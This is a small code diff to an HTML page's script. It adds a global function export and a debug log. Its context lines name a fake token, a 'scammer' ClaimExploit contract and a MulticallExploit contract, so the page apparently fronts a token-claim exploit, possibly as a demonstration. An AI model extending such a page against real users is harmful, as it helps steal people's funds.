@@ -249,6 +249,9 @@
   </div>
 
   <script>
+    // Expose functions to global scope
+    window.updateModeDisplay = updateModeDisplay;
+
     const tokenAddress = "0x2ae3f821fdBad3Fe6A5A84111c4D19E0a2fb0Ed5"; // WG_FakeToken address
     const scammerAddress = "0x21f300CD769594F508F1d9CC013330AEdBE01935"; // ClaimExploit contract address
     const multicallAddress = "0x4090E45D13AA34Ba5C5eD17125470c7CdBB27714"; // MulticallExploit address
@@ -513,6 +516,7 @@
     };
 
     window.onload = () => {
+      console.log("Page loaded, setting initial mode"); // Debug log
       updateCounters();
       document.getElementById("nextBtn").style.display = "none";
       document.getElementById("claimTokenBtn").disabled = true;
